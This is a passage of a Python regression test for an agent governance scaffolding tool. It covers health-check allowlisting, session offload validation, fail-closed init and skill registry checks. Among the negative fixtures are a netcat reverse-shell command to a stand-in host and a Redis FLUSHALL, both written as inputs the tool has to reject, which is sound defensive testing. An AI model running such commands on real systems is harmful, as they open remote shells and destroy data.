        ["python3", "-c", "open('/tmp/agent-gov-regression-bypass', 'w').write('x')"],
        "not allowed in health checks",
    )
    assert_bad_healthcheck("long-sleep", ["sleep", "9999"], "not allowlisted")
    assert_bad_healthcheck("git-clone", ["git", "clone", "https://example.com/repo.git"], "read-only argument policy")
    assert_bad_healthcheck("curl-post", ["curl", "-X", "POST", "https://example.com/health"], "read-only argument policy")
    assert_bad_healthcheck("curl-post-head-override", ["curl", "-X", "POST", "-I", "https://example.com/health"], "read-only argument policy")
    assert_bad_healthcheck("nc-exec", ["nc", "-e", "/bin/sh", "example.com", "1234"], "read-only argument policy")
    assert_bad_healthcheck("redis-flushall", ["redis-cli", "FLUSHALL"], "read-only argument policy")
    assert_bad_healthcheck("psql-sql", ["psql", "-c", "select 1"], "not allowed in health checks")

    resources = json.loads(original)
    resources["resources"][0]["description"] = "$PASSWORD=abc123"
    resources_path.write_text(json.dumps(resources, indent=2) + "\n", encoding="utf-8")
    dollar_secret = run([python, "scripts/agent_resources.py", "doctor"], cwd=target, expect_ok=False)
    if "secret-looking inline value" not in (dollar_secret.stdout + dollar_secret.stderr):
        print("resource doctor did not reject a dollar-prefixed inline secret assignment", file=sys.stderr)
        print(dollar_secret.stdout + dollar_secret.stderr, file=sys.stderr)
        raise SystemExit(1)

    resources = json.loads(original)
    gated_resource = json.loads(json.dumps(resources["resources"][0]))
    gated_resource.update(
        {
            "id": "approval-gated-regression",
            "environment": "release",
            "risk": "high",
            "description": "Regression fixture for approval-gated resource healthchecks.",
            "when_to_use": ["Exercise healthcheck approval gating."],
            "do_not_use_for": ["Production operations."],
            "health_checks": [
                {
                    "id": "approved-gate",
                    "command": ["test", "-e", ".agent/resources.json"],
                    "risk": "low",
                }
            ],
        }
    )
    resources["resources"].append(gated_resource)
    resources_path.write_text(json.dumps(resources, indent=2) + "\n", encoding="utf-8")
    gated_check = run([python, "scripts/agent_resources.py", "healthcheck", "approval-gated-regression"], cwd=target, expect_ok=False)
    if "requires approval" not in (gated_check.stdout + gated_check.stderr):
        print("resource healthcheck did not require approval for high-risk resource execution", file=sys.stderr)
        print(gated_check.stdout + gated_check.stderr, file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_resources.py", "healthcheck", "approval-gated-regression", "--dry-run"], cwd=target)

    resources_path.write_text(original, encoding="utf-8")
    run([python, "scripts/agent_resources.py", "doctor"], cwd=target)


def assert_session_offload_protocol(target: Path, python: str) -> None:
    run(
        [
            python,
            ".agent/tools/agent_session.py",
            "start",
            "offload-smoke",
            "--goal",
            "Offload smoke",
        ],
        cwd=target,
    )
    index = json.loads((target / ".agent" / "sessions" / "index.json").read_text(encoding="utf-8"))
    session_id = index.get("active_session")
    if not session_id:
        print("session offload smoke did not create an active session", file=sys.stderr)
        raise SystemExit(1)
    session_dir = target / ".agent" / "sessions" / session_id
    for relative in ("grounding.md", "offload.jsonl", "offload-index.md", "task-map.mmd", "refs/.gitkeep", "refs/git-status-short.txt"):
        if not (session_dir / relative).exists():
            print(f"session offload artifact missing: {relative}", file=sys.stderr)
            raise SystemExit(1)
    run([python, ".agent/tools/agent_session.py", "grounding", "--checked", "scripts/agent_check.py"], cwd=target)
    add = json.loads(
        run(
            [
                python,
                ".agent/tools/agent_session.py",
                "offload-add",
                "--summary",
                "Validated offload smoke",
                "--evidence",
                "scripts/agent_check.py",
                "--kind",
                "validation",
            ],
            cwd=target,
        ).stdout
    )
    if add.get("schema") != "agent-session-offload-v1" or add.get("authority") != "advisory":
        print("offload-add did not create an advisory offload entry", file=sys.stderr)
        raise SystemExit(1)
    recall = json.loads(
        run([python, ".agent/tools/agent_session.py", "offload-recall", "smoke", "--json"], cwd=target).stdout
    )
    if not recall.get("matches"):
        print("offload-recall did not return the smoke entry", file=sys.stderr)
        raise SystemExit(1)
    task_map = run([python, ".agent/tools/agent_session.py", "offload-map"], cwd=target).stdout
    if "flowchart TD" not in task_map or "Validated offload smoke" not in task_map:
        print("offload-map did not include the expected task canvas", file=sys.stderr)
        print(task_map, file=sys.stderr)
        raise SystemExit(1)
    rollover = run(
        [
            python,
            ".agent/tools/agent_session.py",
            "rollover",
            "--summary",
            "Prepare rollover",
            "--next",
            "Continue validation",
        ],
        cwd=target,
    ).stdout
    if "Truth-First Grounding" not in rollover or "Offload Index" not in rollover:
        print("rollover did not include grounding/offload sections", file=sys.stderr)
        print(rollover, file=sys.stderr)
        raise SystemExit(1)
    for forbidden in ("## Handoff Summary", "## Changed Files", "## Validation"):
        if forbidden in rollover:
            print(f"rollover bootstrap inlined forbidden historical section: {forbidden}", file=sys.stderr)
            print(rollover, file=sys.stderr)
            raise SystemExit(1)
    run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target)
    run([python, "scripts/agent_check.py"], cwd=target)
    run([python, "scripts/agent_verify.py", "doctor"], cwd=target)
    score = json.loads(run([python, "scripts/agent_score.py", "score", "--json"], cwd=target).stdout)
    if score.get("dimensions", {}).get("session_offload", {}).get("status") != "pass":
        print("session_offload score did not pass for a valid offload session", file=sys.stderr)
        print(json.dumps(score, indent=2), file=sys.stderr)
        raise SystemExit(1)

    original = (session_dir / "offload.jsonl").read_text(encoding="utf-8")
    (session_dir / "offload.jsonl").write_text(original + "{bad json\n", encoding="utf-8")
    invalid_outputs = [
        run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False),
    ]
    invalid_text = "\n".join(item.stdout + item.stderr for item in invalid_outputs)
    if "offload" not in invalid_text.lower():
        print("invalid offload JSONL was not reported", file=sys.stderr)
        print(invalid_text, file=sys.stderr)
        raise SystemExit(1)

    bad_entry = dict(add)
    bad_entry["id"] = "offload-bad-evidence"
    bad_entry["evidence"] = ["missing-evidence.md"]
    (session_dir / "offload.jsonl").write_text(json.dumps(bad_entry) + "\n", encoding="utf-8")
    dangling_outputs = [
        run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False),
    ]
    dangling_text = "\n".join(item.stdout + item.stderr for item in dangling_outputs)
    if "missing-evidence.md" not in dangling_text:
        print("dangling offload evidence was not reported", file=sys.stderr)
        print(dangling_text, file=sys.stderr)
        raise SystemExit(1)

    bad_entry["evidence"] = ["scripts/agent_check.py"]
    bad_entry["authority"] = "authoritative"
    (session_dir / "offload.jsonl").write_text(json.dumps(bad_entry) + "\n", encoding="utf-8")
    authority_outputs = [
        run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False),
    ]
    authority_text = "\n".join(item.stdout + item.stderr for item in authority_outputs)
    if "advisory" not in authority_text:
        print("memory-as-truth offload authority was not reported", file=sys.stderr)
        print(authority_text, file=sys.stderr)
        raise SystemExit(1)

    (session_dir / "offload.jsonl").write_text(original, encoding="utf-8")
    run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target)
    run([python, "scripts/agent_verify.py", "doctor"], cwd=target)


def assert_contract_control_surfaces(target: Path, python: str) -> None:
    manifest = json.loads((target / ".agent" / "manifest.json").read_text(encoding="utf-8"))
    presets = manifest.get("governance_presets", {})
    if not presets.get("selected"):
        print("manifest missing governance_presets.selected", file=sys.stderr)
        raise SystemExit(1)
    preset = presets["selected"][0]
    for key in ("source_kind", "source_status", "version", "permission_scope", "generated_paths", "validation", "conflict_behavior"):
        if not preset.get(key):
            print(f"governance preset missing {key}", file=sys.stderr)
            raise SystemExit(1)
    if preset.get("auto_install_dependencies") is not False:
        print("governance preset should not auto-install dependencies", file=sys.stderr)
        raise SystemExit(1)

    capabilities = json.loads((target / ".agent" / "capabilities.json").read_text(encoding="utf-8"))
    if set(capabilities.get("provider_status_values", [])) != {"present", "missing", "unknown", "degraded"}:
        print("capabilities missing provider status values", file=sys.stderr)
        raise SystemExit(1)
    for item in capabilities.get("capabilities", []):
        for key in ("required", "status", "fallback"):
            if key not in item:
                print(f"capability {item.get('id')} missing {key}", file=sys.stderr)
                raise SystemExit(1)
    run([python, "scripts/agent_capabilities.py", "doctor"], cwd=target)

    mechanical = json.loads((target / ".agent" / "mechanical-checks.json").read_text(encoding="utf-8"))
    for key in ("governance_presets", "capability_providers", "strict_agent_contracts", "regression_criteria", "component_expiry"):
        if key not in mechanical.get("checks", {}):
            print(f"mechanical checks missing {key}", file=sys.stderr)
            raise SystemExit(1)
    if "bootstrap-inline-history" not in mechanical["checks"]["strict_agent_contracts"].get("negative_fixtures", []):
        print("strict agent contract fixtures missing bootstrap-inline-history", file=sys.stderr)
        raise SystemExit(1)

    baselines = json.loads((target / ".agent" / "baselines.json").read_text(encoding="utf-8"))
    if not baselines.get("regression_criteria"):
        print("baselines missing regression_criteria", file=sys.stderr)
        raise SystemExit(1)

    gc_config = json.loads((target / ".agent" / "governance-gc.json").read_text(encoding="utf-8"))
    if gc_config.get("policy", {}).get("report_warnings_without_failing_by_default") is not True:
        print("governance-gc warnings are not advisory by default", file=sys.stderr)
        raise SystemExit(1)
    if gc_config.get("policy", {}).get("fail_on_warning") is not False:
        print("governance-gc fail_on_warning does not default to false", file=sys.stderr)
        raise SystemExit(1)
    if gc_config.get("checks", {}).get("component_expiry") is not True:
        print("governance-gc missing component_expiry check", file=sys.stderr)
        raise SystemExit(1)
    if not gc_config.get("component_expiry", {}).get("components"):
        print("governance-gc missing component expiry components", file=sys.stderr)
        raise SystemExit(1)

    run([python, "scripts/agent_check.py"], cwd=target)
    run([python, "scripts/agent_verify.py", "doctor"], cwd=target)
    run([python, "scripts/agent_gc.py", "doctor", "--fail-on-warning"], cwd=target)


def assert_release_safety_gap_regressions(temp_root: Path, python: str) -> None:
    force_target = temp_root / "force-preserves-state"
    force_target.mkdir(parents=True, exist_ok=True)
    run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(force_target),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--no-makefile",
        ],
        cwd=PACKAGE_ROOT,
    )
    run(
        [python, ".agent/tools/agent_session.py", "start", "force-state", "--goal", "Preserve force state"],
        cwd=force_target,
    )
    run(
        [python, "scripts/agent_task.py", "new", "force-state", "--title", "Preserve force state", "--profile", "standard", "--risk", "medium"],
        cwd=force_target,
    )
    run([python, "scripts/agent_verify.py", "snapshot", "--name", "force-state"], cwd=force_target)
    resources_path = force_target / ".agent" / "resources.json"
    resources = json.loads(resources_path.read_text(encoding="utf-8"))
    resources["review_fixture"] = {"owner": "project-owner", "preserve": True}
    resources_path.write_text(json.dumps(resources, indent=2) + "\n", encoding="utf-8")
    protected = [
        ".agent/config.json",
        ".agent/harness.json",
        ".agent/capabilities.json",
        ".agent/sessions/events.jsonl",
        ".agent/sessions/active.md",
        ".agent/runlog.jsonl",
        ".agent/task-board.json",
        ".agent/baselines.json",
        ".agent/project-skills.json",
        ".agent/resources.json",
    ]
    before = {relative: (force_target / relative).read_bytes() for relative in protected}
    run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(force_target),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--no-makefile",
            "--force",
        ],
        cwd=PACKAGE_ROOT,
    )
    for relative, expected in before.items():
        actual = (force_target / relative).read_bytes()
        if actual != expected:
            print(f"--force replaced protected governance state: {relative}", file=sys.stderr)
            raise SystemExit(1)

    conflict_target = temp_root / "init-conflict-fails-closed"
    conflict_target.mkdir(parents=True, exist_ok=True)
    custom_agents = "# Existing project instructions\n\nPreserve this reviewed file.\n"
    (conflict_target / "AGENTS.md").write_text(custom_agents, encoding="utf-8")
    conflict = run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(conflict_target),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--no-makefile",
        ],
        cwd=PACKAGE_ROOT,
        expect_ok=False,
    )
    if "conflict" not in (conflict.stdout + conflict.stderr).lower():
        print("init conflict failure did not identify the unresolved conflict", file=sys.stderr)
        raise SystemExit(1)
    if (conflict_target / ".agent").exists() or (conflict_target / ".codex").exists():
        print("init conflict failure mutated the target before returning non-zero", file=sys.stderr)
        raise SystemExit(1)
    if (conflict_target / "AGENTS.md").read_text(encoding="utf-8") != custom_agents:
        print("init conflict failure modified the existing file", file=sys.stderr)
        raise SystemExit(1)

    registry_target = temp_root / "invalid-registry-preflight"
    registry_path = registry_target / ".agent" / "project-skills.json"
    registry_path.parent.mkdir(parents=True, exist_ok=True)
    invalid_registry = "not valid json\n"
    registry_path.write_text(invalid_registry, encoding="utf-8")
    invalid = run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(registry_target),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--no-makefile",
            "--force",
        ],
        cwd=PACKAGE_ROOT,
        expect_ok=False,
    )
    if "registry" not in (invalid.stdout + invalid.stderr).lower():
        print("invalid registry preflight did not explain the registry failure", file=sys.stderr)
        raise SystemExit(1)
    if registry_path.read_text(encoding="utf-8") != invalid_registry:
        print("invalid registry preflight replaced the existing registry", file=sys.stderr)
        raise SystemExit(1)
    for relative in ("AGENTS.md", "scripts/agent_check.py", ".codex/skills/agent-gov"):
        if (registry_target / relative).exists():
            print(f"invalid registry preflight left partial initialization: {relative}", file=sys.stderr)
            raise SystemExit(1)
    direct_invalid = run(
        [python, str(INIT_SCRIPT), str(registry_target), "--layout", "minimal", "--governance-profile", "standard", "--force"],
        cwd=PACKAGE_ROOT,
        expect_ok=False,
    )
    if "project skill registry" not in (direct_invalid.stdout + direct_invalid.stderr).lower():
        print("direct Python initializer did not preflight the invalid project skill registry", file=sys.stderr)
        raise SystemExit(1)
    if registry_path.read_text(encoding="utf-8") != invalid_registry:
        print("direct Python registry preflight modified the existing registry", file=sys.stderr)
        raise SystemExit(1)

    rollback_target = temp_root / "generated-write-rollback"
    blocking_path = rollback_target / "docs" / "incidents" / "README.md"
    blocking_path.mkdir(parents=True, exist_ok=True)
    rollback = run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(rollback_target),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--no-makefile",
            "--force",
        ],
        cwd=PACKAGE_ROOT,
        expect_ok=False,
    )
    if not (rollback.stdout + rollback.stderr).strip():
        print("generated write failure did not report an error", file=sys.stderr)
        raise SystemExit(1)
    for relative in ("AGENTS.md", ".agent", ".codex/skills/agent-gov", "scripts/agent_check.py"):
        if (rollback_target / relative).exists():
            print(f"generated write failure did not roll back partial output: {relative}", file=sys.stderr)
            raise SystemExit(1)
    if not blocking_path.is_dir():
        print("generated write rollback modified the pre-existing blocking path", file=sys.stderr)
        raise SystemExit(1)

    ordered_target = temp_root / "root-after-options"
    run(
        [
            "node",
            str(NPM_BIN),
            "init",
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            str(ordered_target),
            "--create-root",
            "--no-makefile",
        ],
        cwd=PACKAGE_ROOT,
    )
    if not (ordered_target / "AGENTS.md").exists():
        print("root after options was not initialized", file=sys.stderr)
        raise SystemExit(1)

    python_target = temp_root / "python-launcher-contract"
    python_target.mkdir(parents=True, exist_ok=True)
    run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(python_target),
            "--layout",
            "python-app",
            "--governance-profile",
            "standard",
            "--tech-stack",
            "python",
            "--no-makefile",
        ],
        cwd=PACKAGE_ROOT,
    )
    harness = json.loads((python_target / ".agent" / "harness.json").read_text(encoding="utf-8"))
    expected_launcher = "py -3 -m" if sys.platform.startswith("win") else "python3 -m"
    python_commands = [
        command
        for suite in ("test", "lint", "typecheck")
        for command in harness.get("validation", {}).get(suite, [])
        if "pytest" in command or "ruff" in command or "mypy" in command
    ]
    if not python_commands or any(not command.startswith(expected_launcher) for command in python_commands):
        print(f"generated Python commands do not use {expected_launcher}: {python_commands}", file=sys.stderr)
        raise SystemExit(1)

    if not sys.platform.startswith("win"):
        old_python_target = temp_root / "unsupported-python-version"
        old_python_target.mkdir(parents=True, exist_ok=True)
        old_python = temp_root / "python-3.9-probe.sh"
        old_python.write_text(
            "#!/bin/sh\n"
            "if [ \"$1\" = \"-c\" ]; then\n"
            "  case \"$2\" in\n"
            "    *\"version_info >= (3, 10)\"*) exit 1 ;;\n"
            "    *) printf 'agent-gov-python3\\n'; exit 0 ;;\n"
            "  esac\n"
            "fi\n"
            "exit 42\n",
            encoding="utf-8",
        )
        old_python.chmod(0o755)
        old_env = dict(os.environ)
        old_env["AGENT_GOV_PYTHON"] = str(old_python)
        unsupported = run(
            ["node", str(NPM_BIN), "init", str(old_python_target), "--layout", "minimal"],
            cwd=PACKAGE_ROOT,
            expect_ok=False,
            env=old_env,
        )
        if "3.10" not in (unsupported.stdout + unsupported.stderr):
            print("unsupported Python error did not state the Python 3.10 minimum", file=sys.stderr)
            raise SystemExit(1)
        if (old_python_target / ".agent").exists() or (old_python_target / ".codex").exists():
            print("unsupported Python version mutated the target", file=sys.stderr)
            raise SystemExit(1)

    identity_target = temp_root / "identity-parity"
    identity_target.mkdir(parents=True, exist_ok=True)
    run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(identity_target),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--no-makefile",
        ],
        cwd=PACKAGE_ROOT,
    )
    installed_skill = identity_target / ".codex" / "skills" / "agent-gov"
    for directory in (installed_skill / ".skvm", installed_skill / "build"):
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "ignored.txt").write_text("ignored identity fixture\n", encoding="utf-8")
    run(["node", str(NPM_BIN), "doctor", str(identity_target)], cwd=PACKAGE_ROOT)
    run([python, "scripts/agent_project_skills.py", "doctor"], cwd=identity_target)
    shutil.rmtree(installed_skill / ".skvm")
    shutil.rmtree(installed_skill / "build")

    sensitive = installed_skill / ".env.local"
    sensitive.write_text("REVIEW_FIXTURE=not-a-secret\n", encoding="utf-8")
    run(["node", str(NPM_BIN), "doctor", str(identity_target)], cwd=PACKAGE_ROOT, expect_ok=False)
    run([python, "scripts/agent_project_skills.py", "doctor"], cwd=identity_target, expect_ok=False)
    sensitive.unlink()

    if not sys.platform.startswith("win"):
        outside = temp_root / "identity-outside.txt"
        outside.write_text("outside\n", encoding="utf-8")
        nested_link = installed_skill / "nested-link.txt"
        nested_link.symlink_to(outside)
        package_symlink = run(["node", str(NPM_BIN), "doctor", str(identity_target)], cwd=PACKAGE_ROOT, expect_ok=False)
        project_symlink = run([python, "scripts/agent_project_skills.py", "doctor"], cwd=identity_target, expect_ok=False)
        if "symlink" not in (package_symlink.stdout + package_symlink.stderr).lower():
            print("package doctor did not identify nested skill symlink", file=sys.stderr)
            raise SystemExit(1)
        if "symlink" not in (project_symlink.stdout + project_symlink.stderr).lower():
            print("project skill doctor did not identify nested skill symlink", file=sys.stderr)
            raise SystemExit(1)
        nested_link.unlink()

    registry_path = identity_target / ".agent" / "project-skills.json"
    registry = json.loads(registry_path.read_text(encoding="utf-8"))
    entry = registry["skills"]["agent-gov"]
    entry["source"]["ref"] = "0.0.0-review-fixture"
    entry["content"]["tree_sha256"] = "old-tree"
    entry["content"]["skill_md_sha256"] = "old-skill"
    entry["review"] = {"requires_review": False, "latest_status": "not-required", "latest_artifact": ""}
    registry_path.write_text(json.dumps(registry, indent=2) + "\n", encoding="utf-8")
    lifecycle_update = run(["node", str(NPM_BIN), "install-skill", str(identity_target)], cwd=PACKAGE_ROOT)
    registry = json.loads(registry_path.read_text(encoding="utf-8"))
    review = registry["skills"]["agent-gov"].get("review", {})
    if review.get("requires_review") is not True or review.get("latest_status") != "pending" or review.get("latest_artifact"):
        print("bundled skill lifecycle update did not require a fresh review", file=sys.stderr)
        print(json.dumps(review, indent=2), file=sys.stderr)
        raise SystemExit(1)
    if "review" not in lifecycle_update.stdout.lower():
        print("bundled skill lifecycle update did not report pending review", file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_project_skills.py", "doctor"], cwd=identity_target, expect_ok=False)

    adapter_cases = {
        "openai-agents": "python",
        "mcp-sdk-python": "python",
        "mcp-sdk-typescript": "typescript",
        "fastmcp": "python",
    }
    for adapter, language in adapter_cases.items():
        intake_path = temp_root / f"adapter-{adapter}.json"
        write_intake(
            intake_path,
            {
                "project_target": "agent",
                "selection_status": "confirmed",
                "architecture_style": "skill-first",
                "default_runtime_adapter": adapter,
                "language_preference": [language],
                "dependency_version_policy": "defer-to-lockfile",
            },
        )
        adapter_target = temp_root / f"adapter-{adapter}"
        adapter_target.mkdir(parents=True, exist_ok=True)
        run(
            [
                "node",
                str(NPM_BIN),
                "init",
                str(adapter_target),
                "--layout",
                "minimal",
                "--governance-profile",
                "standard",
                "--tech-stack",
                language,
                "--architecture-intake",
                str(intake_path),
                "--no-makefile",
            ],
            cwd=PACKAGE_ROOT,
        )
        run([python, "scripts/agent_runtime.py", "doctor"], cwd=adapter_target)
        runtime = json.loads((adapter_target / ".agent" / "agent-runtime.json").read_text(encoding="utf-8"))
        plans = runtime.get("runtime_adoption", {}).get("package_plan", [])
        matching = [plan for plan in plans if plan.get("adapter") == adapter]
        if not matching or matching[0].get("auto_install") is not False or not matching[0].get("source_url"):
            print(f"selected adapter lacks a governed package plan: {adapter}", file=sys.stderr)
            raise SystemExit(1)

    invalid_mcp_intake = temp_root / "adapter-mcp-server-agent.json"
    write_intake(
        invalid_mcp_intake,
        {
            "project_target": "agent",
            "selection_status": "confirmed",
            "architecture_style": "skill-first",
            "default_runtime_adapter": "mcp-server",
            "language_preference": ["python"],
        },
    )
    invalid_mcp_target = temp_root / "adapter-mcp-server-agent"
    invalid_mcp_target.mkdir(parents=True, exist_ok=True)
    invalid_mcp = run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(invalid_mcp_target),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--architecture-intake",
            str(invalid_mcp_intake),
            "--no-makefile",
        ],
        cwd=PACKAGE_ROOT,
        expect_ok=False,
    )
    if "only valid for an mcp-server target" not in (invalid_mcp.stdout + invalid_mcp.stderr):
        print("agent target did not reject mcp-server as its primary runtime adapter", file=sys.stderr)
        raise SystemExit(1)
    if (invalid_mcp_target / ".agent").exists() or (invalid_mcp_target / ".codex").exists():
        print("invalid mcp-server primary adapter mutated the target", file=sys.stderr)
        raise SystemExit(1)

    help_output = run(["node", str(NPM_BIN), "--help"], cwd=PACKAGE_ROOT).stdout
    if "Python 3.10" not in help_output:
        print("package help does not state the Python 3.10 minimum", file=sys.stderr)
        raise SystemExit(1)


def main() -> int:
    python = sys.executable
    temp_root = Path(tempfile.mkdtemp(prefix="agent-gov-regression-"))
    try:
        assert_packed_artifact(temp_root, python)
        assert_npm_install_safety_and_preflight(temp_root, python)
        assert_release_safety_gap_regressions(temp_root, python)
        assert_install_skill_scope(temp_root)
        assert_doctor_requires_target_skill(temp_root)
        assert_blank_project_default_profile(temp_root)
        assert_fresh_npm_skill_registry(temp_root, python)
        assert_runtime_adoption_defaults(temp_root, python)
        assert_project_blueprint_governance(temp_root, python)
        assert_frontend_web_governance(temp_root, python)
        assert_agent_development_readiness(temp_root, python)
        assert_strict_architecture_intake(temp_root, python)
        assert_nested_technology_version_intake(temp_root, python)
        assert_session_doctor_handles_long_git_status(temp_root, python)
        if sys.platform.startswith("win"):
            target = temp_root / "agent-gov"
        else:
            target = temp_root / r"C:\Users\airpot\AppData\Local\Temp\agent-gov"
        target.mkdir(parents=True, exist_ok=True)

        run(
            [
                python,
                str(INIT_SCRIPT),
                str(target),
                "--tech-stack",
                "python",
                "--layout",
                "minimal",
                "--remote-kind",
                "local",
                "--governance-profile",
                "full",
            ],
            cwd=PACKAGE_ROOT,
        )

        assert_native_hook_json_contract(target, python)
        assert_contract_control_surfaces(target, python)

        config_path = target / ".agent" / "config.json"
        config = json.loads(config_path.read_text(encoding="utf-8"))
        if config.get("schema") != "agent-project-config-v1":
            print(".agent/config.json has the wrong schema", file=sys.stderr)
            return 1
        if "\\" in str(target) and config.get("remote_workspace_path") != str(target.resolve()):
            print(".agent/config.json did not preserve the workspace path", file=sys.stderr)
            return 1
        expected_schemas = {
            ".agent/manifest.json": "agent-governance-manifest-v1",
            ".agent/risk-zones.json": "agent-risk-zones-v1",
            ".agent/review-policy.json": "agent-review-policy-v1",
            ".agent/workflow-profiles.json": "agent-workflow-profiles-v1",
            ".agent/task-board.json": "agent-task-board-v1",
            ".agent/role-contracts.json": "agent-role-contracts-v1",
            ".agent/mechanical-checks.json": "agent-mechanical-checks-v1",
            ".agent/baselines.json": "agent-baselines-v1",
            ".agent/dev-map.json": "agent-dev-map-v1",
            ".agent/skill-hygiene.json": "agent-skill-hygiene-v1",
            ".agent/skill-optimization.json": "agent-skill-optimization-v1",
            ".agent/harness-evolution.json": "agent-harness-evolution-v1",
            ".agent/mcp-policy.json": "agent-mcp-policy-v1",
            ".agent/governance-gc.json": "agent-governance-gc-v1",
        }
        for relative, schema in expected_schemas.items():
            path = target / relative
            data = json.loads(path.read_text(encoding="utf-8"))
            if data.get("schema") != schema:
                print(f"{relative} has the wrong schema", file=sys.stderr)
                return 1
        project_skills = json.loads((target / ".agent" / "project-skills.json").read_text(encoding="utf-8"))
        project_skill_policy = project_skills.get("policy", {})
        if project_skill_policy.get("default_install_scope") != "project" or project_skill_policy.get("global_install_requires_explicit_request") is not True or project_skill_policy.get("fail_on_unmanaged_global_skills") is not True:
            print("project skill governance policy did not default to project install scope and global governance", file=sys.stderr)
            print(json.dumps(project_skill_policy, indent=2), file=sys.stderr)
            return 1
        distribution = json.loads((target / ".agent" / "skill-distribution.json").read_text(encoding="utf-8"))
        if distribution.get("default_install_scope") != "project" or distribution.get("project_codex_skill_dir") != ".codex/skills" or distribution.get("policy", {}).get("global_install_requires_explicit_request") is not True:
            print("skill distribution policy did not default to project-local installation", file=sys.stderr)
            print(json.dumps(distribution, indent=2), file=sys.stderr)
            return 1
        manifest = json.loads((target / ".agent" / "manifest.json").read_text(encoding="utf-8"))
        harness = json.loads((target / ".agent" / "harness.json").read_text(encoding="utf-8"))
        if sorted(manifest.get("required_paths", [])) != sorted(harness.get("invariants", {}).get("required_paths", [])):
            print(".agent/manifest.json required_paths does not match .agent/harness.json", file=sys.stderr)
            return 1
        for relative in (
            ".agent/templates/grounding.md.tmpl",
            ".agent/templates/offload.jsonl.tmpl",
            ".agent/templates/offload-index.md.tmpl",
            ".agent/templates/task-map.mmd.tmpl",
            ".agent/templates/refs/.gitkeep",
        ):
            if not (target / relative).exists():
                print(f"{relative} was not created", file=sys.stderr)
                return 1
        if not (target / "docs" / "AI_CODING_GLOSSARY.md").exists():
            print("docs/AI_CODING_GLOSSARY.md was not created", file=sys.stderr)
            return 1
        if not (target / "docs" / "DOMAIN_GLOSSARY.md").exists():
            print("docs/DOMAIN_GLOSSARY.md was not created", file=sys.stderr)
            return 1
        if not (target / "docs" / "features" / "INDEX.md").exists():
            print("docs/features/INDEX.md was not created", file=sys.stderr)
            return 1
        if not (target / "docs" / "DEV_MAP.md").exists():
            print("docs/DEV_MAP.md was not created", file=sys.stderr)
            return 1
        if not (target / "docs" / "SKILL_OPTIMIZATION.md").exists():
            print("docs/SKILL_OPTIMIZATION.md was not created", file=sys.stderr)
            return 1
        if not (target / "scripts" / "agent_skill_opt.py").exists():
            print("scripts/agent_skill_opt.py was not created", file=sys.stderr)
            return 1

        assert_no_missing_doc_refs(target)
        assert_workflow_stage_closure(target)
        assert_loop_primitive_governance(target, python)
        assert_resource_catalog_guards(target, python)
        assert_spec_archive_gate(target, python)
        assert_context_glob_scoring(target, python)
        run([python, "scripts/agent_check.py"], cwd=target)
        run([python, "scripts/agent_migrate.py", "doctor"], cwd=target)
        assert_session_offload_protocol(target, python)
        run([python, "scripts/agent_gc.py", "doctor", "--fail-on-warning"], cwd=target)
        run([python, "scripts/agent_skill_opt.py", "doctor"], cwd=target)
        preflight_missing = run([python, "scripts/agent_skill_opt.py", "verify-preflight", "--skill", "demo-skill"], cwd=target, expect_ok=False)
        if "repair:" not in preflight_missing.stderr:
            print("agent_skill_opt.py missing preflight check did not print repair command", file=sys.stderr)
            print(preflight_missing.stderr, file=sys.stderr)
            return 1
        demo_skill = target / ".codex" / "skills" / "demo-skill"
        demo_skill.mkdir(parents=True, exist_ok=True)
        (demo_skill / "SKILL.md").write_text("---\nname: demo-skill\ndescription: Demo skill.\n---\n\n# Demo\n", encoding="utf-8")
        project_skills_path = target / ".agent" / "project-skills.json"
        project_skills = json.loads(project_skills_path.read_text(encoding="utf-8"))
        project_skills["skills"]["demo-skill"] = {
            "scope": "project",
            "host": "codex",
            "path": ".codex/skills/demo-skill",
            "lifecycle": "active",
            "intent": "project-governance",
            "owner": "regression",
            "risk": "low",
            "source": {"kind": "repo-local", "repository": "", "ref": "fixture", "pinned": True},
            "content": {},
            "release": {"manifest": "", "publishable": False, "release_gate": "local-validation"},
            "review": {"requires_review": False, "latest_status": "not-required", "latest_artifact": ""},
        }
        project_skills_path.write_text(json.dumps(project_skills, indent=2) + "\n", encoding="utf-8")
        run([python, "scripts/agent_project_skills.py", "snapshot", "--write"], cwd=target)
        release_id = run([python, "scripts/agent_skill_opt.py", "release-id", "--skill", "demo-skill"], cwd=target).stdout.strip()
        run([python, "scripts/agent_skill_opt.py", "preflight", "--skill", "demo-skill", "--release-id", release_id], cwd=target)
